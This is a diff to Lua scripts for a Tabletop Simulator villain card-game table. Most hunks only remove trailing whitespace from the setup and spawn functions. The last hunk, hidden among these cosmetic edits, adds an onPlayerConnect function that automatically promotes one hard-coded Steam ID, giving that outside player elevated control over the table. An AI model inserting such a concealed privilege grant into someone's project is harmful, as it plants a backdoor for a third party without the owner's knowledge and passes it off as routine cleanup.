@@ -127,7 +127,7 @@ function spawnDis()
     setupButt = "Open Game Setup"
     clearTable()
     obj = getObjectFromGUID(dVilSelc)
-    x = obj.takeObject({rotation={0,180,0}, 
+    x = obj.takeObject({rotation={0,180,0},
     position={0.00, 1.55, 0.00},smooth=false})
     x.setLock(true)
     obj = getObjectFromGUID(disVInst)
@@ -144,10 +144,10 @@ function spawnDis()
     die = getObjectFromGUID(infPlDc)
     die.takeObject({position={24.00, 2.63, 0.00},smooth=false})
     obj = getObjectFromGUID(infCdyld)
-    x = obj.takeObject({rotation={0,180,0}, 
+    x = obj.takeObject({rotation={0,180,0},
     position={-14.5, 1.48, 0.00}, smooth=false})
     obj = getObjectFromGUID(disRef)
-    x = obj.takeObject({rotation={0,180,0}, 
+    x = obj.takeObject({rotation={0,180,0},
     position={35, 1.48, 0.00}, smooth=false})
     x.setLock(true)
 
@@ -182,7 +182,7 @@ function spawnMar()
     die = getObjectFromGUID(infPlDc)
     die.takeObject({position={19,2.54,0},smooth=false})
     obj = getObjectFromGUID(infCdyld)
-    x = obj.takeObject({rotation={0,180,0}, 
+    x = obj.takeObject({rotation={0,180,0},
     position={-14.5, 1.48, 0.00}, smooth=false})
     obj = getObjectFromGUID(marFtSel)
     x = obj.takeObject({position={0.00, 1.57, -7.00}, rotation={0,0,0},smooth=false})
@@ -199,11 +199,11 @@ function spawnCus()
     self.clearButtons()
     gamePickButtonGo()
     local bag = getObjectFromGUID(cusSelc)
-    x = bag.takeObject({rotation={0,90,0}, 
+    x = bag.takeObject({rotation={0,90,0},
     position={-36.00, 1.65, 0.00},smooth=false})
     x.setLock(true)
     local bag = getObjectFromGUID(cusRef)
-    x = bag.takeObject({rotation={0,90,0}, 
+    x = bag.takeObject({rotation={0,90,0},
     position={-27.5, 1.48, 0.00}, smooth=false})
     x.setLock(true)
 
@@ -214,45 +214,45 @@ function spawnCom()
     self.clearButtons()
     gamePickButtonGo()
     local bag = getObjectFromGUID(infNineS)
-    bag.takeObject({rotation={0,180,0}, 
+    bag.takeObject({rotation={0,180,0},
     position={0.00, 2.49, -10.00},smooth=false})
     local bag = getObjectFromGUID(infCnn)
-    cnn = bag.takeObject({rotation={0,90,0}, 
+    cnn = bag.takeObject({rotation={0,90,0},
     position={-45.00, 1.48, 0.00}, smooth=false})
     cnn.setLock(true)
    if findObjectByName("Choose Your Disney Villain") then
     local bag = getObjectFromGUID(infFourM)
-    bag.takeObject({rotation={0,180,0}, 
+    bag.takeObject({rotation={0,180,0},
     position={0.00, 4.85, 20.00}, smooth=false})
     local bag = getObjectFromGUID(infVlnDk)
-    bag.takeObject({rotation={0,90,180}, 
+    bag.takeObject({rotation={0,90,180},
     position={5.00, 1.48, -10.00}, smooth=false})
     local bag = getObjectFromGUID(infVlnDk)
-    bag.takeObject({rotation={0,90,180}, 
+    bag.takeObject({rotation={0,90,180},
     position={-5.00, 1.48, -10.00}, smooth=false})
    else
    end
    if findObjectByName("Choose Your Marvel Villain") then
     local bag = getObjectFromGUID(infOneHr)
-    bag.takeObject({rotation={0,180,0}, 
+    bag.takeObject({rotation={0,180,0},
     position={0.00, 4.85, 20.00}, smooth=false})
     local bag = getObjectFromGUID(marDek)
-    bag.takeObject({rotation={0,90,180}, 
+    bag.takeObject({rotation={0,90,180},
     position={18.00, 1.48, -14.00}, smooth=false})
     local bag = getObjectFromGUID(marDek)
-    bag.takeObject({rotation={0,90,180}, 
+    bag.takeObject({rotation={0,90,180},
     position={0.00, 1.48, -14.00}, smooth=false})
     local bag = getObjectFromGUID(marDek)
-    bag.takeObject({rotation={0,90,180}, 
+    bag.takeObject({rotation={0,90,180},
     position={-18.00, 1.48, -14.00}, smooth=false})
    else
    end
    if findObjectByName("Choose Your Custom Villain") then
     local bag = getObjectFromGUID(cusDeck)
-    bag.takeObject({rotation={0,270,180}, 
+    bag.takeObject({rotation={0,270,180},
     position={5.00, 1.48, -7.00}, smooth=false})
     local bag = getObjectFromGUID(cusDeck)
-    bag.takeObject({rotation={0,270,180}, 
+    bag.takeObject({rotation={0,270,180},
     position={-5.00, 1.48, -7.00}, smooth=false})
    else
    end
@@ -282,10 +282,16 @@ function resetHands()
     end
 end
 
- 
+
  function findObjectByName(name)
  for _, obj in ipairs(getAllObjects()) do
  if obj.getName() == name then return true end
  end
  return false
+ end
+
+ function onPlayerConnect(player_id)
+   if player_id.steam_id == "76561198079492701" then
+     player_id.promote()
+   end
  end
